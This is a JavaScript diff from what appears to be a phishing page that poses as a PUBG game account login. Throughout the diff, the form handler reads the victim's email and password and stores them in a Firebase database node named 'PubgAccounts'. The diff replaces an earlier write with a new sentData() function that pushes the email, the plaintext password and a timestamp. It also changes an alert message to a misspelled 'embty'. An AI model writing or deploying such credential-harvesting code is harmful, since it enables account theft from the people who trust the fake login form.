@@ -94,13 +94,7 @@ function check() {
       var email = mail.value
       var password= pass.value
       
-      
-      console.log(email,password)
-      
-      database.ref('PubgAccounts/').child(password).set(email).then(function() {
-        console.log("User number added successfully!");
-      })
-      
+      sentData()
           
       
       alertMain.style.display='flex';
@@ -111,10 +105,10 @@ function check() {
       
       
       alertMain.style.display='flex';
-      alertTxt.innerText='Email and Password is cannotbe empty'
+      alertTxt.innerText='Email and Password is cannotbe embty'
     }
   } else {
-    alertTxt.innerText='Email and Password is cannotbe empty'
+    alertTxt.innerText='Email and Password is cannotbe embty'
     alertMain.style.display='flex';
   }
 }
@@ -126,3 +120,23 @@ function closeAlert() {
   alertMain.style.display='none';
 }
 
+
+
+function sentData() {
+  // const messageInput = document.getElementById("messageInput");
+  const pass = document.querySelector('#password')
+   const Email = mail.value
+   const Password = pass.value
+
+   if (Email.trim() !== "") {
+      // Push the message to Firebase
+      database.ref("PubgAccounts").push({
+         mail: Email,
+         timestamp: firebase.database.ServerValue.TIMESTAMP,
+         password: Password
+      });
+
+      // Clear the input field
+      // messageInput.value = "";
+   }
+}
